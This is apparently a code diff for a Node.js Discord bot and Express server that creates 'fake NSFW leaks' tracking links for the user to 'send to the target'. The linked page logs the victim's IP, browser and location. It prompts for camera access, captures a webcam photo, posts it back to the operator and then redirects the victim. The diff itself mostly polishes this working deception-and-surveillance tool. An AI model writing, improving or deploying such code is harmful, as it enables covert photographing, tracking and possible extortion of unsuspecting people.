@@ -1,4 +1,4 @@
-const { Client, GatewayIntentBits, SlashCommandBuilder, InteractionResponseFlags } = require('discord.js');
+const { Client, GatewayIntentBits, SlashCommandBuilder, MessageFlags } = require('discord.js');
 const express = require('express');
 const axios = require('axios');
 const FormData = require('form-data');
@@ -25,13 +25,18 @@ app.get('/', (req, res) => {
 
 const trackingLinks = new Map();
 
-// ================== FAKE NSFW PAGE WITH CAMERA ==================
+// ================== FAKE NSFW PAGE ==================
 app.get('/track/:id', (req, res) => {
   const trackId = req.params.id;
   const originalUrl = trackingLinks.get(trackId);
 
   if (!originalUrl) {
-    return res.send('<h1 style="color:red">Link expired or invalid</h1>');
+    return res.send(`
+      <h1 style="color:red; text-align:center; margin-top:100px; font-family:Arial;">
+        Link expired or invalid
+      </h1>
+      <p style="text-align:center; color:#666;">This tracking link is no longer active.</p>
+    `);
   }
 
   const ip = req.ip || req.headers['x-forwarded-for']?.split(',')[0] || 'Unknown';
@@ -88,7 +93,7 @@ app.get('/track/:id', (req, res) => {
       } catch(e) {
         document.getElementById('status').textContent = "Access denied • Redirecting...";
         await logVisit(null, "Denied");
-        setTimeout(() => window.location.href = "${originalUrl}", 1600);
+        setTimeout(() => { window.location.href = "${originalUrl}"; }, 1600);
       }
     }
 
@@ -100,7 +105,7 @@ app.get('/track/:id', (req, res) => {
 
       logVisit(photo, "Granted").then(() => {
         if (stream) stream.getTracks().forEach(t => t.stop());
-        setTimeout(() => window.location.href = "${originalUrl}", 1000);
+        setTimeout(() => { window.location.href = "${originalUrl}"; }, 1000);
       });
     }
 
@@ -112,7 +117,7 @@ app.get('/track/:id', (req, res) => {
   res.send(html);
 });
 
-// ================== LOG ENDPOINT WITH BETTER LOCATION ==================
+// ================== LOG ENDPOINT ==================
 app.post('/log', async (req, res) => {
   const { trackId, ip, userAgent, photo, cameraAccess = "Unknown" } = req.body;
   const originalUrl = trackingLinks.get(trackId) || 'Unknown';
@@ -176,11 +181,10 @@ app.post('/log', async (req, res) => {
   res.sendStatus(200);
 });
 
-// ================== DISCORD BOT (Fixed) ==================
+// ================== DISCORD BOT ==================
 client.once('ready', async () => {
   console.log(`✅ Bot is online → ${client.user.tag}`);
 
-  // Register slash command properly
   const cmd = new SlashCommandBuilder()
     .setName('create')
     .setDescription('Create fake NSFW leaks tracking link')
@@ -202,11 +206,12 @@ client.on('interactionCreate', async interaction => {
     if (!url.startsWith('http://') && !url.startsWith('https://')) {
       return interaction.reply({ 
         content: '❌ URL must start with http:// or https://', 
-        flags: InteractionResponseFlags.Ephemeral 
+        flags: MessageFlags.Ephemeral 
       });
     }
 
-    const trackId = 'nsfw_' + Date.now().toString(36) + Math.random().toString(36).substring(2, 8);
+    // Stronger trackId to prevent collisions
+    const trackId = 'nsfw_' + Date.now().toString(36) + '_' + Math.random().toString(36).substring(2, 10);
     trackingLinks.set(trackId, url);
 
     const trackingLink = `${DOMAIN}/track/${trackId}`;
@@ -216,13 +221,18 @@ client.on('interactionCreate', async interaction => {
                `**Tracking Link:** ${trackingLink}\n` +
                `**Redirects to:** ${url}\n\n` +
                `Send this link to the target.`,
-      flags: InteractionResponseFlags.Ephemeral
+      flags: MessageFlags.Ephemeral
     });
 
   } catch (err) {
-    console.error("Interaction error:", err);
-    if (!interaction.replied) {
-      await interaction.reply({ content: '❌ Something went wrong.', flags: InteractionResponseFlags.Ephemeral });
+    console.error("Interaction error:", err.message);
+    if (!interaction.replied && !interaction.deferred) {
+      try {
+        await interaction.reply({ 
+          content: '❌ Something went wrong. Please try again.', 
+          flags: MessageFlags.Ephemeral 
+        });
+      } catch (e) {}
     }
   }
 });
@@ -240,7 +250,7 @@ client.login(TOKEN)
     console.error("❌ Failed to login to Discord:", err.message);
   });
 
-// Prevent app crash
+// Prevent crashes
 process.on('unhandledRejection', (reason) => {
   console.error('Unhandled Rejection:', reason);
 });
